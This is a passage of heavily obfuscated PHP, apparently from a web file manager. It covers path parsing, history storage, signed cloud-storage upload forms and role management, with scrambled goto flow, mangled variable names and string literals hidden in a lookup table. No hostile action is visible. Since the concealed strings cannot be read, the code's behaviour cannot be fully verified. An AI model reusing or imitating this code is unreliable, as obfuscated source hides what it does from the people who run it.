rtrim(get_path_father($f…Ôğ¨ù), $CõãÍ‡™»¹[8]) . $CõãÍ‡™»¹[8], $CõãÍ‡™»¹[366] => array()); goto D†½ôá©Ø; E×ù¨Ÿô¿ì: $CõãÍ‡™»¹ =& $_SERVER[¬ı§†‰ú˜¼]; if ($DñŠ­Ë¦Ù‰ && !IO::exist($fã–âÅÌŠ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto CÚ½¯”§“; D†½ôá©Ø: $d‡ê®ùñ™¾ = IO::getContent($dš¤Ñí„†”[$CõãÍ‡™»¹[1129]]); if ($d‡ê®ùñ™¾) { $eƒ”ËáÓ¦Ä = json_decode($d‡ê®ùñ™¾, !0); if (is_array($eƒ”ËáÓ¦Ä)) { $dš¤Ñí„†”[$CõãÍ‡™»¹[366]] = $eƒ”ËáÓ¦Ä; } } return $dš¤Ñí„†”; goto a—’Ğ­İ; a—’Ğ­İ: } private static function saveData($dÉÂÉˆ©Ôğ, $C£Î‘ºëİ±) { goto CŒŸ£”´¬Ü; CŒŸ£”´¬Ü: $dèáŠ“ïµ =& $_SERVER[¬ı§†‰ú˜¼]; self::log($dèáŠ“ïµ[1132] . $dÉÂÉˆ©Ôğ . $dèáŠ“ïµ[68] . count($C£Î‘ºëİ±), $dèáŠ“ïµ[716]); if ($C£Î‘ºëİ±) { return IO::setContent($dÉÂÉˆ©Ôğ, json_encode($C£Î‘ºëİ±)); } goto DºïÁ‹’‚; f‹µ™¬…ùò: return !0; goto e¶ÑòªˆŞ; DºïÁ‹’‚: $e£ïæÇÁèÇ = IO::pathFather($dÉÂÉˆ©Ôğ); IO::remove($dÉÂÉˆ©Ôğ); self::clearEmptyFolder($e£ïæÇÁèÇ); goto f‹µ™¬…ùò; e¶ÑòªˆŞ: } public static function clearEmptyFolder($bšÂğ²Õêà) { goto e›ñéÀö™; B´µœ‡†‡î: $b‘¤³‹ß­‘ = IO::has($bšÂğ²Õêà, !0); if ($b‘¤³‹ß­‘[$cÙ¨£ñÑ‡[202]] > 0 || $b‘¤³‹ß­‘[$cÙ¨£ñÑ‡[203]] > 0) { return; } IO::remove($bšÂğ²Õêà); goto dôî°ÅÔçò; dôî°ÅÔçò: self::clearEmptyFolder($EäèÃÜí²¿); goto CÃ„¢ÍÅ­‰; e›ñéÀö™: $cÙ¨£ñÑ‡ =& $_SERVER[¬ı§†‰ú˜¼]; if (trim($bšÂğ²Õêà, $cÙ¨£ñÑ‡[8]) == trim(self::$_historyBase, $cÙ¨£ñÑ‡[8])) { return; } $EäèÃÜí²¿ = IO::pathFather($bšÂğ²Õêà); goto B´µœ‡†‡î; CÃ„¢ÍÅ­‰: } private static function getBasePath() { goto dÃ×¾‹ß©¶; bé×¬²±: file_put_contents($bŒáŸ°¤ï£ . $AÖ•¯ÀÆ¤„[1136], $AÖ•¯ÀÆ¤„[33]); Model($AÖ•¯ÀÆ¤„[1133])->set($AÖ•¯ÀÆ¤„[1134], $bŒáŸ°¤ï£); return $bŒáŸ°¤ï£; goto d–òß„¥¡ ; dÃ×¾‹ß©¶: $AÖ•¯ÀÆ¤„ =& $_SERVER[¬ı§†‰ú˜¼]; $bŒáŸ°¤ï£ = Model($AÖ•¯ÀÆ¤„[1133])->get($AÖ•¯ÀÆ¤„[1134]); if (IO::exist($bŒáŸ°¤ï£)) { return $bŒáŸ°¤ï£; } goto a¶ŒÔ›¢ğæ; a¶ŒÔ›¢ğæ: $bŒáŸ°¤ï£ = DATA_PATH . $AÖ•¯ÀÆ¤„[1135]; $bŒáŸ°¤ï£ = IO::mkdir($bŒáŸ°¤ï£); $bŒáŸ°¤ï£ = rtrim($bŒáŸ°¤ï£, $AÖ•¯ÀÆ¤„[8]) . $AÖ•¯ÀÆ¤„[8]; goto bé×¬²±; d–òß„¥¡ : } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\162\122\x65\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\x69\154\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\x72\x46\151\154\145\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\x70\x52\157\x6f\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\123\150\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\162\x53\x68\x61\x72\145\114\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\162\x65\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\141\162\145\x49\164\145\x6d\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\173\x73\x65\x61\x72\143\x68\x7d"; const KOD_BLOCK = "\173\x62\x6c\157\x63\153\175"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\173\x75\163\145\162\122\x65\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\151\166\x65\x72\x7d"; public static function typeList() { $F¿¹²æ‹§² =& $_SERVER[¬ı§†‰ú˜¼]; return array($F¿¹²æ‹§²[1137] => self::KOD_SOURCE, $F¿¹²æ‹§²[1138] => self::KOD_USER_RECYCLE, $F¿¹²æ‹§²[1139] => self::KOD_USER_FAV, $F¿¹²æ‹§²[1140] => self::KOD_USER_FILE_TAG, $F¿¹²æ‹§²[1141] => self::KOD_USER_FILE_TYPE, $F¿¹²æ‹§²[1142] => self::KOD_GROUP_ROOT_SELF, $F¿¹²æ‹§²[1143] => self::KOD_USER_SHARE, $F¿¹²æ‹§²[1144] => self::KOD_USER_SHARE_LINK, $F¿¹²æ‹§²[1145] => self::KOD_USER_SHARE_TO_ME, $F¿¹²æ‹§²[1146] => self::KOD_SHARE_ITEM, $F¿¹²æ‹§²[1147] => self::KOD_SHARE_LINK, $F¿¹²æ‹§²[1148] => self::KOD_SEARCH, $F¿¹²æ‹§²[1149] => self::KOD_BLOCK, $F¿¹²æ‹§²[1150] => self::KOD_IO, $F¿¹²æ‹§²[1151] => self::KOD_USER_RECENT, $F¿¹²æ‹§²[1152] => self::KOD_USER_DRIVER); } public static function parse($AŸ÷è£á¯) { goto cãïíİš¿„; cãïíİš¿„: $FĞÉ³ôÑ²Œ =& $_SERVER[¬ı§†‰ú˜¼]; $AŸ÷è£á¯ = self::clear($AŸ÷è£á¯); $AŸŞĞ’Ğîå = array_values(self::typeList()); goto aÁ¸‡Î“¥‰; F¼…âäŸŞ¦: $e¶ËÓš–ë¹ = array($FĞÉ³ôÑ²Œ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $a³¬Ù”‹ôÒ[$FĞÉ³ôÑ²Œ[1119]] = in_array($a³¬Ù”‹ôÒ[$FĞÉ³ôÑ²Œ[29]], $e¶ËÓš–ë¹); return $a³¬Ù”‹ôÒ; goto D§Ûª ¹Ï; aÁ¸‡Î“¥‰: preg_match($FĞÉ³ôÑ²Œ[1153], $AŸ÷è£á¯, $dß¹ÒÖÀ‡§); $a³¬Ù”‹ôÒ = array($FĞÉ³ôÑ²Œ[413] => !1, $FĞÉ³ôÑ²Œ[1154] => !1, $FĞÉ³ôÑ²Œ[410] => !1, $FĞÉ³ôÑ²Œ[76] => $AŸ÷è£á¯, $FĞÉ³ôÑ²Œ[1064] => !1, $FĞÉ³ôÑ²Œ[1063] => $FĞÉ³ôÑ²Œ[33]); if (is_array($dß¹ÒÖÀ‡§) && count($dß¹ÒÖÀ‡§) == 5) { $BÈõóÓæù¤ = $FĞÉ³ôÑ²Œ[1155] . $dß¹ÒÖÀ‡§[2] . $FĞÉ³ôÑ²Œ[324]; if (in_array($BÈõóÓæù¤, $AŸŞĞ’Ğîå)) { $a³¬Ù”‹ôÒ[$FĞÉ³ôÑ²Œ[1064]] = $dß¹ÒÖÀ‡§[1]; $a³¬Ù”‹ôÒ[$FĞÉ³ôÑ²Œ[29]] = $BÈõóÓæù¤; $a³¬Ù”‹ôÒ[$FĞÉ³ôÑ²Œ[1156]] = substr($BÈõóÓæù¤, 1, -1); $a³¬Ù”‹ôÒ[$FĞÉ³ôÑ²Œ[392]] = $dß¹ÒÖÀ‡§[3]; } $a³¬Ù”‹ôÒ[$FĞÉ³ôÑ²Œ[1063]] = $dß¹ÒÖÀ‡§[4]; } goto F¼…âäŸŞ¦; D§Ûª ¹Ï: } public static function isTruePath($AÊÙ‘„õà) { goto AçÈô®; AçÈô®: $a…Œ äÎ¤ˆ =& $_SERVER[¬ı§†‰ú˜¼]; if (substr($AÊÙ‘„õà, 0, 1) != $a…Œ äÎ¤ˆ[1155]) { return !0; } if (strpos($AÊÙ‘„õà, $a…Œ äÎ¤ˆ[399]) === 0) { return !0; } goto d™ƒ¯¬†é¦; d™ƒ¯¬†é¦: if (strpos($AÊÙ‘„õà, $a…Œ äÎ¤ˆ[1122]) === 0) { return !0; } if (strpos($AÊÙ‘„õà, $a…Œ äÎ¤ˆ[1157]) === 0) { return !0; } if (strpos($AÊÙ‘„õà, $a…Œ äÎ¤ˆ[1158]) === 0) { return !0; } goto bæÑ¶Üİ; bæÑ¶Üİ: if (strpos($AÊÙ‘„õà, $a…Œ äÎ¤ˆ[1159]) === 0) { return !0; } return !1; goto eçĞºòî»ä; eçĞºòî»ä: } public static function clear($F Áì½ÛÉ) { goto fô‘ÇÑç«‘; fô‘ÇÑç«‘: $E¬Ü‰´ÔŞç =& $_SERVER[¬ı§†‰ú˜¼]; $F Áì½ÛÉ = str_replace(array($E¬Ü‰´ÔŞç[1037], $E¬Ü‰´ÔŞç[228]), $E¬Ü‰´ÔŞç[50], $F Áì½ÛÉ); $F Áì½ÛÉ = str_replace($E¬Ü‰´ÔŞç[97], $E¬Ü‰´ÔŞç[8], $F Áì½ÛÉ); goto DÚÓë™Ö–; FÈ¥ö …Û: return $F Áì½ÛÉ; goto C¬ôå’‘ïƒ; A¥ƒìÚ³½: $F Áì½ÛÉ = preg_replace($E¬Ü‰´ÔŞç[1162], $E¬Ü‰´ÔŞç[8], $F Áì½ÛÉ); if ($F Áì½ÛÉ == $E¬Ü‰´ÔŞç[8]) { return $E¬Ü‰´ÔŞç[8]; } $F Áì½ÛÉ = rtrim($F Áì½ÛÉ, $E¬Ü‰´ÔŞç[8]); goto FÈ¥ö …Û; DÚÓë™Ö–: $bĞßÆØà²† = $E¬Ü‰´ÔŞç[1160]; if (substr($F Áì½ÛÉ, 0, 3) == $E¬Ü‰´ÔŞç[1161]) { $F Áì½ÛÉ = substr($F Áì½ÛÉ, 3); } while (strstr($F Áì½ÛÉ, $bĞßÆØà²†)) { $F Áì½ÛÉ = str_replace($bĞßÆØà²†, $E¬Ü‰´ÔŞç[8], $F Áì½ÛÉ); } goto A¥ƒìÚ³½; C¬ôå’‘ïƒ: } public static function sourceID($B¤˜ùˆ„œâ) { $A„¼Œ°ƒ—„ =& $_SERVER[¬ı§†‰ú˜¼]; $Aë—…”‘Ô„ = self::parse($B¤˜ùˆ„œâ); if ($Aë—…”‘Ô„[$A„¼Œ°ƒ—„[29]] !== self::KOD_SOURCE) { show_json(LNG($A„¼Œ°ƒ—„[1163]), !1); } return $Aë—…”‘Ô„[$A„¼Œ°ƒ—„[392]]; } public static function make($BÀ­Òé»òØ) { if (!$BÀ­Òé»òØ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($BÀ­Òé»òØ)); } public static function makeShare($Eõ˜ëƒ‰æº, $c¹ó¼Ì˜ï‘) { return self::makePath(self::KOD_SHARE_ITEM, $Eõ˜ëƒ‰æº, $c¹ó¼Ì˜ï‘); } public static function makeFileTypePath($d£Ò–†ó„„) { return self::makePath(self::KOD_USER_FILE_TYPE, $d£Ò–†ó„„); } public static function makeFileTagPath($B¼Å‚Í¢¿¼) { return self::makePath(self::KOD_USER_FILE_TAG, $B¼Å‚Í¢¿¼); } public static function makePath($få‹À³ÑÑ‘, $eå„äŠÒŠï = '', $c¸‡„ßÊ¾Œ = '') { $E”£èŒˆ¥‹ =& $_SERVER[¬ı§†‰ú˜¼]; $bç¸ß‡‹ ÷ = substr($få‹À³ÑÑ‘, 1, -1); $F˜Ú¡Ã•·ƒ = $E”£èŒˆ¥‹[1164] . $bç¸ß‡‹ ÷ . $E”£èŒˆ¥‹[1165] . $eå„äŠÒŠï . $E”£èŒˆ¥‹[1166]; $F˜Ú¡Ã•·ƒ = $c¸‡„ßÊ¾Œ ? $F˜Ú¡Ã•·ƒ . $c¸‡„ßÊ¾Œ . $E”£èŒˆ¥‹[8] : $F˜Ú¡Ã•·ƒ; return $F˜Ú¡Ã•·ƒ; } public static function hashPath($d·ŞŠ¹ğÑİ, $F‚•Û¬‘åõ = true) { goto d»³ìŒçíˆ; d™ˆàÉ¹©Ò: return $eöÏá‰·ÀÅ; goto a•åÏ‡Ú¡; D“‚ÙËÕº„: if (!$eöÏá‰·ÀÅ && isset($c‰êùëÄñ[$B Ò¸Ì–½´[394]])) { $c‰êùëÄñ = IO::info(KodIO::make($c‰êùëÄñ[$B Ò¸Ì–½´[394]])); $eöÏá‰·ÀÅ = _get($c‰êùëÄñ, $B Ò¸Ì–½´[1167], $B Ò¸Ì–½´[33]); } if (!$eöÏá‰·ÀÅ && $F‚•Û¬‘åõ) { $DÔ§¼Ğ¬† = KodIO::parse($c‰êùëÄñ[$B Ò¸Ì–½´[76]]); if (!$DÔ§¼Ğ¬†[$B Ò¸Ì–½´[29]]) { $eöÏá‰·ÀÅ = IO::hashSimple($c‰êùëÄñ[$B Ò¸Ì–½´[76]]); } } if (!$eöÏá‰·ÀÅ) { $eöÏá‰·ÀÅ = md5($c‰êùëÄñ[$B Ò¸Ì–½´[76]] . $c‰êùëÄñ[$B Ò¸Ì–½´[78]] . $c‰êùëÄñ[$B Ò¸Ì–½´[84]]); } goto d™ˆàÉ¹©Ò; d»³ìŒçíˆ: $B Ò¸Ì–½´ =& $_SERVER[¬ı§†‰ú˜¼]; $c‰êùëÄñ = is_array($d·ŞŠ¹ğÑİ) ? $d·ŞŠ¹ğÑİ : IO::info($d·ŞŠ¹ğÑİ); $eöÏá‰·ÀÅ = _get($c‰êùëÄñ, $B Ò¸Ì–½´[1167], $B Ò¸Ì–½´[33]); goto D“‚ÙËÕº„; a•åÏ‡Ú¡: } public static function initSystemPath() { goto b˜àóÀîÈ; eØÃ×ªÑ¦¥: define($Cƒ÷¤„›ßä[1170], self::systemPath($Cƒ÷¤„›ßä[1171])); define($Cƒ÷¤„›ßä[1172], self::systemPath($Cƒ÷¤„›ßä[1173])); define($Cƒ÷¤„›ßä[1174], self::systemPath($Cƒ÷¤„›ßä[1175])); goto cÄ•Ş¯ÎÈ²; cÄ•Ş¯ÎÈ²: IOHistory::bindEvent(); goto cß‰Ô«Ôè¬; b˜àóÀîÈ: $Cƒ÷¤„›ßä =& $_SERVER[¬ı§†‰ú˜¼]; if (defined($Cƒ÷¤„›ßä[1168])) { return; } define($Cƒ÷¤„›ßä[1168], self::systemPath($Cƒ÷¤„›ßä[1169])); goto eØÃ×ªÑ¦¥; cß‰Ô«Ôè¬: } public static function systemPath($dã¶Ù¼÷»ì) { goto Bêæ­£¤ğç; eø…Ê´®Ê: if ($DŒí¯§¦±) { return $DŒí¯§¦±; } if ($dã¶Ù¼÷»ì == $a“ó¤®ïï¤[1169]) { $DŒí¯§¦± = self::make(Model($a“ó¤®ïï¤[798])->systemRootPathAdd($a“ó¤®ïï¤[504])); } else { $DŒí¯§¦± = self::systemPath($a“ó¤®ïï¤[1169]); $a¬¿†»¦» = self::sourceID($DŒí¯§¦±); $DŒí¯§¦± = self::make(Model($a“ó¤®ïï¤[798])->mkdir($a¬¿†»¦», $dã¶Ù¼÷»ì)); } Model($a“ó¤®ïï¤[731])->set($A°ÒïÏ„Ù˜, $DŒí¯§¦±); goto d½‘ôİÃ¹¤; Bêæ­£¤ğç: $a“ó¤®ïï¤ =& $_SERVER[¬ı§†‰ú˜¼]; $A°ÒïÏ„Ù˜ = $a“ó¤®ïï¤[1176] . ucfirst($dã¶Ù¼÷»ì); $DŒí¯§¦± = Model($a“ó¤®ïï¤[731])->get($A°ÒïÏ„Ù˜); goto eø…Ê´®Ê; d½‘ôİÃ¹¤: return $DŒí¯§¦±; goto b‰Ïö×µ’; b‰Ïö×µ’: } public static function systemFolder($A½Ì·² Ô•) { $FÁêÈß‘‚Á = IO_PATH_SYSTEM_SOURCE . $A½Ì·² Ô•; $b¤¨ŠËÉõ = Cache::get($FÁêÈß‘‚Á); if (!$b¤¨ŠËÉõ) { $FÙ¿Š¬ËŠ = IO::infoFull($FÁêÈß‘‚Á); if (!$FÙ¿Š¬ËŠ) { $b¤¨ŠËÉõ = IO::mkdir($FÁêÈß‘‚Á, REPEAT_SKIP); } else { $b¤¨ŠËÉõ = $FÙ¿Š¬ËŠ[$_SERVER[¬ı§†‰ú˜¼][76]]; } Cache::set($FÁêÈß‘‚Á, $b¤¨ŠËÉõ, 3600 * 10); } return $b¤¨ŠËÉõ; } public static function defaultDriver() { return Model($_SERVER[¬ı§†‰ú˜¼][728])->defaultDriver(); } public static function defaultIO() { $eŸ–…°µ¸£ =& $_SERVER[¬ı§†‰ú˜¼]; $D«ò¿â†‹Ñ = self::defaultDriver(); return $eŸ–…°µ¸£[1177] . $D«ò¿â†‹Ñ[$eŸ–…°µ¸£[392]] . $eŸ–…°µ¸£[1166]; } public static function defaultDriverInit() { static $fùĞâ´Å—¹ = false; if ($fùĞâ´Å—¹) { return $fùĞâ´Å—¹; } $fùĞâ´Å—¹ = IO::init(self::defaultIO()); return $fùĞâ´Å—¹; } public static function fileTypeList() { $D Ø­Š¤Ã =& $_SERVER[¬ı§†‰ú˜¼]; $AÖå­ëµŠğ = $GLOBALS[$D Ø­Š¤Ã[6]][$D Ø­Š¤Ã[1178]]; foreach ($AÖå­ëµŠğ as $C˜ÈêÑÛ‚º => $dåàŒ¹Î) { $Eˆ®®£ƒ¢£ = $D Ø­Š¤Ã[1179] . $C˜ÈêÑÛ‚º; $Dõ‹ñ§¯á = LNG($Eˆ®®£ƒ¢£); if ($Eˆ®®£ƒ¢£ != $Dõ‹ñ§¯á) { $AÖå­ëµŠğ[$C˜ÈêÑÛ‚º][$D Ø­Š¤Ã[28]] = $Dõ‹ñ§¯á; } } return $AÖå­ëµŠğ; } public static function transferType($B÷É‚„ŠÜ, $CÔ»¶ÚµØ¬) { goto aÊƒ‹øˆ­³; DÀ‡ÍÙÏ: return $e™Óòï‹¨[1182]; goto E°ƒ³¹ªÚ; aÊƒ‹øˆ­³: $e™Óòï‹¨ =& $_SERVER[¬ı§†‰ú˜¼]; $D¼×™İ‚£  = self::driverType($B÷É‚„ŠÜ); $Eœ·¡ƒÕ°Å = self::driverType($CÔ»¶ÚµØ¬); goto Bññ‚öÍ†ø; Bññ‚öÍ†ø: if ($D¼×™İ‚£ [$e™Óòï‹¨[29]] == $Eœ·¡ƒÕ°Å[$e™Óòï‹¨[29]] && $D¼×™İ‚£ [$e™Óòï‹¨[1180]] == $Eœ·¡ƒÕ°Å[$e™Óòï‹¨[1180]]) { return $e™Óòï‹¨[1181]; } if ($D¼×™İ‚£ [$e™Óòï‹¨[29]] == $e™Óòï‹¨[832] && $Eœ·¡ƒÕ°Å[$e™Óòï‹¨[29]] == $e™Óòï‹¨[106]) { return $e™Óòï‹¨[1093]; } if ($D¼×™İ‚£ [$e™Óòï‹¨[29]] == $e™Óòï‹¨[106] && $Eœ·¡ƒÕ°Å[$e™Óòï‹¨[29]] == $e™Óòï‹¨[832]) { return $e™Óòï‹¨[107]; } goto DÀ‡ÍÙÏ; E°ƒ³¹ªÚ: } public static function driverType($FŠ—Ü‹íÍŒ) { goto BˆœæÙ²Æ; b°¢¢Ê±³ó: return array($Eò»®Å×êŠ[29] => $Eò»®Å×êŠ[832], $Eò»®Å×êŠ[1180] => $FŠ—Ü‹íÍŒ->pathDriver, $Eò»®Å×êŠ[76] => $F°ÖÎ¤Çˆğ); goto E’©ƒÙ; fÃ¾ù½ÉÉ¤: if ($BêÒÃŒò¼ == $Eò»®Å×êŠ[719] || $BêÒÃŒò¼ == $Eò»®Å×êŠ[1184] || $BêÒÃŒò¼ == $Eò»®Å×êŠ[1185]) { $FŠ—Ü‹íÍŒ = self::defaultDriverInit(); } else { if ($BêÒÃŒò¼ == $Eò»®Å×êŠ[1100] || $BêÒÃŒò¼ == $Eò»®Å×êŠ[1186]) { $FŠ—Ü‹íÍŒ = IO::init($FŠ—Ü‹íÍŒ->pathParse[$Eò»®Å×êŠ[1047]]); } } $BêÒÃŒò¼ = str_replace($Eò»®Å×êŠ[1183], $Eò»®Å×êŠ[33], strtolower($FŠ—Ü‹íÍŒ->getType())); if ($BêÒÃŒò¼ == $Eò»®Å×êŠ[106]) { return array($Eò»®Å×êŠ[29] => $Eò»®Å×êŠ[106], $Eò»®Å×êŠ[1180] => $Eò»®Å×êŠ[33], $Eò»®Å×êŠ[76] => $F°ÖÎ¤Çˆğ); } goto b°¢¢Ê±³ó; BˆœæÙ²Æ: $Eò»®Å×êŠ =& $_SERVER[¬ı§†‰ú˜¼]; $F°ÖÎ¤Çˆğ = $FŠ—Ü‹íÍŒ->path; $BêÒÃŒò¼ = str_replace($Eò»®Å×êŠ[1183], $Eò»®Å×êŠ[33], strtolower($FŠ—Ü‹íÍŒ->getType())); goto fÃ¾ù½ÉÉ¤; E’©ƒÙ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($AîÑ‹Å ÁÏ) { parent::__construct($AîÑ‹Å ÁÏ); $this->signatureVersion($_SERVER[¬ı§†‰ú˜¼][211]); } public function uploadFormData($cá¯Õ£ÜÂ, $e¼Ğ†„¦ïâ = 3600) { goto eĞœÎ÷ÍÓ; cÛáËœŠ‡æ: $b¤ÃÓ‚‰ç¸ = array($B±¶–®ˆ“[1189] => $fã®â©ÆŒª, $B±¶–®ˆ“[1190] => array(array($B±¶–®ˆ“[1191] => $aÖæŞğí“‡), array($B±¶–®ˆ“[1192] => $this->bucket), array($B±¶–®ˆ“[1193], $B±¶–®ˆ“[1194], $B±¶–®ˆ“[33]), array($B±¶–®ˆ“[1195] => $b¥»”òù), array($B±¶–®ˆ“[1196] => $aÓÎÄœÎß), array($B±¶–®ˆ“[1197] => $this->accessKey), array($B±¶–®ˆ“[1198] => $eİÀŸ½Î²Ù))); $b¤ÃÓ‚‰ç¸ = json_encode($b¤ÃÓ‚‰ç¸); $DŒÌ§‹‚Ãì = hash_hmac($B±¶–®ˆ“[229], $eİÀŸ½Î²Ù, $this->secret); goto b­ù½ƒã‚; A­Ñ˜áµ§¨: $b¥»”òù = $B±¶–®ˆ“[1187]; $fã®â©ÆŒª = gmdate($B±¶–®ˆ“[1188], time() + $e¼Ğ†„¦ïâ); $eİÀŸ½Î²Ù = (string) time() . $B±¶–®ˆ“[68] . (string) (time() + $e¼Ğ†„¦ïâ); goto cÛáËœŠ‡æ; eĞœÎ÷ÍÓ: $B±¶–®ˆ“ =& $_SERVER[¬ı§†‰ú˜¼]; $aÖæŞğí“‡ = $B±¶–®ˆ“[191]; $aÓÎÄœÎß = $B±¶–®ˆ“[229]; goto A­Ñ˜áµ§¨; b­ù½ƒã‚: $e˜„òô‡Š = sha1($b¤ÃÓ‚‰ç¸); $AÕ¤–ªÎÚ = hash_hmac($B±¶–®ˆ“[229], $e˜„òô‡Š, $DŒÌ§‹‚Ãì); $aæö‚ÚÜö = array($B±¶–®ˆ“[1191] => $aÖæŞğí“‡, $B±¶–®ˆ“[1195] => $b¥»”òù, $B±¶–®ˆ“[1199] => base64_encode($b¤ÃÓ‚‰ç¸), $B±¶–®ˆ“[1196] => $aÓÎÄœÎß, $B±¶–®ˆ“[1197] => $this->accessKey, $B±¶–®ˆ“[1200] => $eİÀŸ½Î²Ù, $B±¶–®ˆ“[1201] => $AÕ¤–ªÎÚ, $B±¶–®ˆ“[175] => $this->getHost()); goto C½•Ï÷Âî; C½•Ï÷Âî: return $aæö‚ÚÜö; goto E¤ÉšÑ—‹ä; E¤ÉšÑ—‹ä: } public function fileOutLink($dÃï ¤È´Á) { $BµÛ„©‰¼ë =& $_SERVER[¬ı§†‰ú˜¼]; if (substr($dÃï ¤È´Á, 0, 7) == $BµÛ„©‰¼ë[1202]) { $dÃï ¤È´Á = $BµÛ„©‰¼ë[1203] . substr($dÃï ¤È´Á, 7); } header($BµÛ„©‰¼ë[159] . $dÃï ¤È´Á); die; } } goto EÔØ£¸ ’Ò; FŠ©¶²ÎôË: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\x72\x6f\x6c\145\x4c\151\163\x74"; public $field = array("\156\x61\x6d\x65", "\x61\165\164\150", "\154\x61\142\145\154", "\144\151\x73\160\154\141\171", "\x73\x79\x73\x74\145\x6d", "\144\x65\163\143", "\151\147\x6e\x6f\162\x65\x45\170\x74", "\x69\147\156\157\x72\145\x46\151\x6c\145\x53\151\x7a\145", "\x61\x64\155\151\156\x69\x73\164\162\x61\164\x6f\x72", "\163\157\162\x74"); public function listData($bÖÃÊé†Ì• = false, $d”šÖ£¢¸Ğ = "\x73\x6f\162\164", $c‰ƒÈ±ŒâÀ = false) { $dŒÚƒ÷ÇöÊ =& $_SERVER[¬ı§†‰ú˜¼]; $c‚¦’‹»îø = parent::listData($bÖÃÊé†Ì•, $d”šÖ£¢¸Ğ, $c‰ƒÈ±ŒâÀ); if (!$bÖÃÊé†Ì•) { foreach ($c‚¦’‹»îø as $EÍ‹¹‰Å => $f¬ˆÌó¥”ø) { if ($f¬ˆÌó¥”ø[$dŒÚƒ÷ÇöÊ[1879]] == 1) { $c‚¦’‹»îø[$EÍ‹¹‰Å][$dŒÚƒ÷ÇöÊ[429]] = LNG($dŒÚƒ÷ÇöÊ[2103]); } } } return $c‚¦’‹»îø; } public function update($bØ£…ç«Ö÷, $D¾»Ëî¸†ó) { goto cÉÀÏ¥êîÄ; cÉÀÏ¥êîÄ: $AÏšĞŠëŒ¢ =& $_SERVER[¬ı§†‰ú˜¼]; $Dº¥ÓˆÚÓ¿ = parent::listData($bØ£…ç«Ö÷); $dÇÓÎ¯‹õ = $this->findByName($D¾»Ëî¸†ó[$AÏšĞŠëŒ¢[28]]); goto e·ÛÈãœè’; e·ÛÈãœè’: if (!$Dº¥ÓˆÚÓ¿ || $dÇÓÎ¯‹õ && $dÇÓÎ¯‹õ[$AÏšĞŠëŒ¢[392]] != $Dº¥ÓˆÚÓ¿[$AÏšĞŠëŒ¢[392]]) { return !1; } if ($dÇÓÎ¯‹õ[$AÏšĞŠëŒ¢[1879]] == 1) { $D¾»Ëî¸†ó = array($AÏšĞŠëŒ¢[28] => $D¾»Ëî¸†ó[$AÏšĞŠëŒ¢[28]], $AÏšĞŠëŒ¢[1711] => $D¾»Ëî¸†ó[$AÏšĞŠëŒ¢[1711]]); } $this->filterAuth($D¾»Ëî¸†ó[$AÏšĞŠëŒ¢[404]]); goto d“í¢›ˆ÷œ; d“í¢›ˆ÷œ: return parent::update($bØ£…ç«Ö÷, $D¾»Ëî¸†ó); goto aËÃ¢ç¤èæ; aËÃ¢ç¤èæ: } public function remove($eÏÀ§†¼‚») { $aÊğîÇƒí = parent::listData($eÏÀ§†¼‚»); if (!$aÊğîÇƒí || $aÊğîÇƒí[$_SERVER[¬ı§†‰ú˜¼][1169]]) { return !1; } return parent::remove($eÏÀ§†¼‚»); } public function add($d¡£ë…êç) { goto fä¿©ô‡ºŸ; cÅƒ¢¸ËŠ÷: $CİÃ¢‰ÅÓÏ = array($aÙğÜ‰ù[411] => $bŒ¤“‡«ƒ, $aÙğÜ‰ù[1696] => $aÙğÜ‰ù[33], $aÙğÜ‰ù[1692] => $aÙğÜ‰ù[1700], $aÙğÜ‰ù[2104] => 1, $aÙğÜ‰ù[1695] => 0, $aÙğÜ‰ù[2105] => 0, $aÙğÜ‰ù[1694] => $this->getSort()); $d¡£ë…êç = array_merge($CİÃ¢‰ÅÓÏ, $d¡£ë…êç); $this->filterAuth($d¡£ë…êç[$aÙğÜ‰ù[404]]); goto b´¾Ô£«Û; b´¾Ô£«Û: return parent::insert($d¡£ë…êç); goto BˆËİ’‡â¹; fä¿©ô‡ºŸ: $aÙğÜ‰ù =& $_SERVER[¬ı§†‰ú˜¼]; $bŒ¤“‡«ƒ = $d¡£ë…êç[$aÙğÜ‰ù[28]]; if ($this->findByName($bŒ¤“‡«ƒ)) { return !1; } goto cÅƒ¢¸ËŠ÷; BˆËİ’‡â¹: } private function getSort() { $eÛË‚²©ôæ =& $_SERVER[¬ı§†‰ú˜¼]; $d½ÍÕÜÙÖ = parent::listData(); $bšˆëÉÂØã = array_to_keyvalue($d½ÍÕÜÙÖ, $eÛË‚²©ôæ[33], $eÛË‚²©ôæ[1713]); return empty($bšˆëÉÂØã) ? 0 : max($bšˆëÉÂØã) + 1; } private function filterAuth(&$DÓÃ„’¨Ùô) { $F»›„ò¯îƒ =& $_SERVER[¬ı§†‰ú˜¼]; $eš¡ÕÆöì£ = array(); $f«§ÔÛÍ˜Ä = array_filter(explode($F»›„ò¯îƒ[47], $DÓÃ„’¨Ùô)); foreach ($f«§ÔÛÍ˜Ä as $DÓÃ„’¨Ùô) { $cõğÙ‹Şä– = explode($F»›„ò¯îƒ[95], $DÓÃ„’¨Ùô); if ($cõğÙ‹Şä–[0] == $F»›„ò¯îƒ[2106] && $cõğÙ‹Şä–[1] 